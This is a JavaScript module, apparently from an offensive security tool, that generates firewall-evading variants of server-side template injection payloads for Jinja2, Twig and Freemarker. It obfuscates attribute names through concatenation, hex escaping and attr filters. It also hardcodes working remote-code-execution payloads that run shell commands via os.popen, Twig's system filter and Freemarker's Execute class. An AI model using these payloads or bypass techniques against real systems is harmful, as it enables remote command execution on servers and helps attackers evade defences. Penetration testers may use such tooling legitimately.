/**
 * SSTI WAF Bypass Engine
 * Generates multiple evasion variants for Server-Side Template Injection payloads.
 * Supports: Jinja2, Twig, Freemarker
 */

import { hexEscape } from '../utils/encoding'
import { pickOne } from '../utils/helpers'

/* ── Detect template syntax ───────────────────────── */
function detectTemplateParts(payload) {
  // Extract content between {{ }} or {% %}
  const exprMatch = payload.match(/\{\{(.*?)\}\}/s)
  const blockMatch = payload.match(/\{%(.*?)%\}/s)
  return {
    expression: exprMatch ? exprMatch[1].trim() : null,
    block: blockMatch ? blockMatch[1].trim() : null,
    raw: payload,
  }
}

/* ── Extract dunder attributes ────────────────────── */
function extractDunders(expr) {
  // Find __word__ patterns
  return expr.match(/__\w+__/g) || []
}

/* ── String Concatenation ─────────────────────────── */
function applyStringConcat(payload, target) {
  const variants = []
  const dunders = extractDunders(payload)

  if (dunders.length === 0) {
    // No dunder attributes, try to split generic strings
    variants.push(payload)
    return variants
  }

  for (const dunder of dunders) {
    // Split in the middle: '__cla' + 'ss__'
    const inner = dunder.slice(2, -2) // e.g., "class"
    const mid = Math.floor(inner.length / 2)
    const part1 = '__' + inner.slice(0, mid)
    const part2 = inner.slice(mid) + '__'

    if (target === 'jinja2') {
      // Jinja2: self['__cla'+'ss__']
      let v = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `['${part1}'+'${part2}']`
      )
      variants.push(v)

      // Using ~ (Jinja2 concat operator)
      let v2 = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `[('${part1}'~'${part2}')]`
      )
      variants.push(v2)

      // join filter
      let v3 = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `[['${part1}','${part2}']|join]`
      )
      variants.push(v3)
    } else if (target === 'twig') {
      // Twig: self['__cla'~'ss__']
      let v = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `['${part1}'~'${part2}']`
      )
      variants.push(v)
    } else if (target === 'freemarker') {
      // Freemarker: .getClass() instead of .__class__
      let v = payload.replace(/__class__/g, 'class').replace(/\./g, '.getClass().')
      variants.push(v)
    }
  }

  return variants
}

/* ── Hex Encoding ─────────────────────────────────── */
function applyHexEncoding(payload, target) {
  const variants = []
  const dunders = extractDunders(payload)

  if (dunders.length === 0) return [payload]

  for (const dunder of dunders) {
    if (target === 'jinja2') {
      // Hex escape: self['\x5f\x5fclass\x5f\x5f']
      const hexed = hexEscape(dunder)
      let v = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `['${hexed}']`
      )
      variants.push(v)

      // Unicode escape variant
      const unicoded = Array.from(dunder).map(c => '\\u00' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
      let v2 = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `['${unicoded}']`
      )
      variants.push(v2)
    } else if (target === 'twig') {
      const hexed = hexEscape(dunder)
      let v = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
        `['${hexed}']`
      )
      variants.push(v)
    }
  }

  return variants
}

/* ── Attribute Filter Bypass (Jinja2) ─────────────── */
function applyAttrAccess(payload, target) {
  const variants = []

  if (target === 'jinja2') {
    const dunders = extractDunders(payload)
    for (const dunder of dunders) {
      // |attr() filter
      let v = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]`, 'g'),
        `|attr("${dunder}")`
      )
      variants.push(v)

      // |attr() with hex
      const hexed = hexEscape(dunder)
      let v2 = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]`, 'g'),
        `|attr('${hexed}')`
      )
      variants.push(v2)

      // __getattr__
      let v3 = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]`, 'g'),
        `.__getattribute__("${dunder}")`
      )
      variants.push(v3)
    }
  } else if (target === 'twig') {
    // Twig: attribute() function
    const dunders = extractDunders(payload)
    for (const dunder of dunders) {
      let v = payload.replace(
        new RegExp(`\\.${dunder}|\\['${dunder}'\\]`, 'g'),
        `|filter((v) => attribute(v, "${dunder}"))`
      )
      variants.push(v)
    }
  }

  return variants
}

/* ── Filter / Set Bypass ──────────────────────────── */
function applyFilterBypass(payload, target) {
  const variants = []

  if (target === 'jinja2') {
    const { expression } = detectTemplateParts(payload)
    if (!expression) return [payload]

    // {% set x = ... %} indirect access
    variants.push(`{%set x=self.__class__%}{%set y=x.__mro__%}{%set z=y[1]%}{%set w=z.__subclasses__()%}{{w}}`)

    // request object bypass
    variants.push(`{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}`)

    // lipsum bypass
    variants.push(`{{lipsum.__globals__['os'].popen('id').read()}}`)

    // cycler bypass
    variants.push(`{{cycler.__init__.__globals__.os.popen('id').read()}}`)

    // config bypass
    variants.push(`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`)
  } else if (target === 'twig') {
    // Twig filter bypass
    variants.push(`{{['id']|filter('system')}}`)
    variants.push(`{{['id']|map('system')}}`)
    variants.push(`{{'id'|filter('system')}}`)
    variants.push(`{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`)
  } else if (target === 'freemarker') {
    // Freemarker bypass
    variants.push(`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`)
    variants.push(`[#assign ex="freemarker.template.utility.Execute"?new()]\${ex("id")}`)
    variants.push(`\${"freemarker.template.utility.Execute"?new()("id")}`)
  }

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateSstiVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('string-concat')) {
    applyStringConcat(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'String Concat', layers: ['string-concat'] })
    })
  }

  if (layers.includes('hex-encoding')) {
    applyHexEncoding(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Hex Encoding', layers: ['hex-encoding'] })
    })
  }

  if (layers.includes('attr-access')) {
    applyAttrAccess(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Attr Access', layers: ['attr-access'] })
    })
  }

  if (layers.includes('filter-bypass')) {
    applyFilterBypass(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Filter Bypass', layers: ['filter-bypass'] })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('string-concat') && layers.includes('hex-encoding') && target === 'jinja2') {
      const dunders = extractDunders(payload)
      if (dunders.length > 0) {
        const dunder = dunders[0]
        const inner = dunder.slice(2, -2)
        const hexPart1 = hexEscape('__' + inner.slice(0, Math.floor(inner.length / 2)))
        const hexPart2 = hexEscape(inner.slice(Math.floor(inner.length / 2)) + '__')
        let combo = payload.replace(
          new RegExp(`\\.${dunder}|\\['${dunder}'\\]|${dunder}`, 'g'),
          `['${hexPart1}'+'${hexPart2}']`
        )
        allVariants.push({ payload: combo, label: 'Concat + Hex', layers: ['string-concat', 'hex-encoding'] })
      }
    }
  }

  // Deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
